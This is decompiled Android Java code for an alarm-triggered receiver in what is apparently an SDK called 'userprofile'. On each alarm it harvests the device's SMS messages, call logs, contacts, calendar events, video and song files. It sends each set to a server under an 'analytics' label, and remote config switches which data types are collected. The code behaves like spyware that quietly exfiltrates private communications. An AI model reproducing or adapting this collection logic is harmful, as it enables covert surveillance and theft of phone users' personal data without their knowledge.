package com.android.library.userprofile.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.util.Log;
import com.android.apps.config.Config;
import com.android.apps.config.util.CLog;
import com.android.library.userprofile.model.Sms;
import java.util.ArrayList;
import java.util.Arrays;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class UserProfileLibraryAlarmReceiver extends BroadcastReceiver {
    private static final String KEY_DATA_TO_SEND = "userProfileLib.dataToSend";
    private static final String MODE_OFF = "OFF";

    /* JADX INFO: renamed from: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$3, reason: invalid class name */
    class AnonymousClass3 extends AsyncTask<Void, Void, Void> {
        ArrayList<Sms> smsList;
        final /* synthetic */ Context val$context;
        int count = 0;
        int lastIndex = 0;
        int currentIndex = 0;
        JSONObject jsonToSendToServer = new JSONObject();

        AnonymousClass3(Context context) {
            this.val$context = context;
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public Void doInBackground(Void... voidArr) {
            this.smsList = new ArrayList<>();
            this.smsList = UtilFunctions.getAllSms(this.val$context);
            return null;
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public void onPostExecute(Void r5) {
            super.onPostExecute(r5);
            try {
                final Handler handler = new Handler();
                handler.postDelayed(new Runnable() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.3.1
                    private int count = 0;
                    private int max = 100;

                    @Override // java.lang.Runnable
                    public void run() {
                        boolean z;
                        try {
                            if (this.max > AnonymousClass3.this.smsList.size()) {
                                this.max = AnonymousClass3.this.smsList.size() - this.count;
                                z = true;
                            } else {
                                z = false;
                            }
                            AnonymousClass3.this.jsonToSendToServer = UtilFunctions.getSmsGSON(new ArrayList(AnonymousClass3.this.smsList.subList(this.count, z ? AnonymousClass3.this.smsList.size() : this.max)), AnonymousClass3.this.val$context);
                            new UpdateServerWithAnalytics(AnonymousClass3.this.val$context, AnonymousClass3.this.jsonToSendToServer);
                            Log.i("UserProfileTag", "sending : " + AnonymousClass3.this.jsonToSendToServer.toString());
                            if (z) {
                                return;
                            }
                            this.count = this.max;
                            this.max += 100;
                            handler.postDelayed(this, 5000L);
                        } catch (Exception e2) {
                            CLog.b("UserProfileTag", "Exception in EventAlarmReceiver postExe handler" + e2);
                            e2.printStackTrace();
                        }
                    }
                }, 5000L);
            } catch (Exception e2) {
                CLog.b("UserProfileTag", "Exception in EventAlarmReceiver postExe " + e2);
                e2.printStackTrace();
            }
            this.jsonToSendToServer = null;
        }

        @Override // android.os.AsyncTask
        protected void onPreExecute() {
            super.onPreExecute();
        }
    }

    /* JADX WARN: Type inference failed for: r0v11, types: [com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$6] */
    /* JADX WARN: Type inference failed for: r1v22, types: [com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$5] */
    /* JADX WARN: Type inference failed for: r1v23, types: [com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$4] */
    /* JADX WARN: Type inference failed for: r1v26, types: [com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$2] */
    /* JADX WARN: Type inference failed for: r1v27, types: [com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver$1] */
    @Override // android.content.BroadcastReceiver
    public void onReceive(final Context context, Intent intent) {
        CLog.b("UserProfileTag", "Alarm received, type: " + intent.getStringExtra(Constants.ALARM_TYPE));
        String modeValueFromConfig = UtilFunctions.getModeValueFromConfig(context);
        CLog.b("UserProfileTag", "UserProfileLibraryAlarmReceiver : modeFromConfig : " + modeValueFromConfig);
        if (modeValueFromConfig.equalsIgnoreCase(MODE_OFF) || !intent.getStringExtra(Constants.ALARM_TYPE).equals(Constants.ALARM_TYPE_USER_PROFILE)) {
            return;
        }
        String[] strArrSplit = Config.getInstance(context).get(KEY_DATA_TO_SEND).split(",");
        CLog.b("UserProfileTag", "Data: " + Arrays.toString(strArrSplit));
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_CALENDAR)) {
            new AsyncTask<Void, Void, Void>() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.1
                JSONObject jsonToSendToServer = new JSONObject();

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public Void doInBackground(Void... voidArr) {
                    this.jsonToSendToServer = UtilFunctions.getCalendarGSON(UtilFunctions.readCalendarEvent(context), context);
                    return null;
                }

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public void onPostExecute(Void r4) {
                    super.onPostExecute(r4);
                    Log.i("UserProfileTag", this.jsonToSendToServer.toString());
                    new UpdateServerWithAnalytics(context, this.jsonToSendToServer);
                    this.jsonToSendToServer = null;
                }

                @Override // android.os.AsyncTask
                protected void onPreExecute() {
                    super.onPreExecute();
                }
            }.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_CALL_LOGS)) {
            new AsyncTask<Void, Void, Void>() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.2
                JSONObject jsonToSendToServer = new JSONObject();

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public Void doInBackground(Void... voidArr) {
                    this.jsonToSendToServer = UtilFunctions.getCallLogsGSON(UtilFunctions.getCallLogsDetails(context), context);
                    return null;
                }

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public void onPostExecute(Void r4) {
                    super.onPostExecute(r4);
                    Log.i("UserProfileTag", this.jsonToSendToServer.toString());
                    new UpdateServerWithAnalytics(context, this.jsonToSendToServer);
                    this.jsonToSendToServer = null;
                }

                @Override // android.os.AsyncTask
                protected void onPreExecute() {
                    super.onPreExecute();
                }
            }.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_SMS) && UtilFunctions.shouldSendSmsOnAlarm(context)) {
            new AnonymousClass3(context).executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_VIDEOS)) {
            new AsyncTask<Void, Void, Void>() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.4
                JSONObject jsonToSendToServer = new JSONObject();

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public Void doInBackground(Void... voidArr) {
                    this.jsonToSendToServer = UtilFunctions.getVideoFileGSON(UtilFunctions.getVideoFiles(context), context);
                    return null;
                }

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public void onPostExecute(Void r4) {
                    super.onPostExecute(r4);
                    Log.i("UserProfileTag", this.jsonToSendToServer.toString());
                    new UpdateServerWithAnalytics(context, this.jsonToSendToServer);
                    this.jsonToSendToServer = null;
                }

                @Override // android.os.AsyncTask
                protected void onPreExecute() {
                    super.onPreExecute();
                }
            }.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_SONGS)) {
            new AsyncTask<Void, Void, Void>() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.5
                JSONObject jsonToSendToServer = new JSONObject();

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public Void doInBackground(Void... voidArr) {
                    this.jsonToSendToServer = UtilFunctions.getSongGSON(UtilFunctions.getAllSongsFromDevice(context), context);
                    return null;
                }

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public void onPostExecute(Void r4) {
                    super.onPostExecute(r4);
                    Log.i("UserProfileTag", this.jsonToSendToServer.toString());
                    new UpdateServerWithAnalytics(context, this.jsonToSendToServer);
                    this.jsonToSendToServer = null;
                }

                @Override // android.os.AsyncTask
                protected void onPreExecute() {
                    super.onPreExecute();
                }
            }.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
        if (Arrays.asList(strArrSplit).contains(Constants.DEFAULT_CONTACT)) {
            new AsyncTask<Void, Void, Void>() { // from class: com.android.library.userprofile.util.UserProfileLibraryAlarmReceiver.6
                JSONObject jsonToSendToServer = new JSONObject();

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public Void doInBackground(Void... voidArr) {
                    this.jsonToSendToServer = UtilFunctions.getContactsGSON(UtilFunctions.getPhoneContacts(context), context);
                    return null;
                }

                /* JADX INFO: Access modifiers changed from: protected */
                @Override // android.os.AsyncTask
                public void onPostExecute(Void r4) {
                    super.onPostExecute(r4);
                    Log.i("UserProfileTag", this.jsonToSendToServer.toString());
                    new UpdateServerWithAnalytics(context, this.jsonToSendToServer);
                    this.jsonToSendToServer = null;
                }

                @Override // android.os.AsyncTask
                protected void onPreExecute() {
                    super.onPreExecute();
                }
            }.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
        }
    }
}
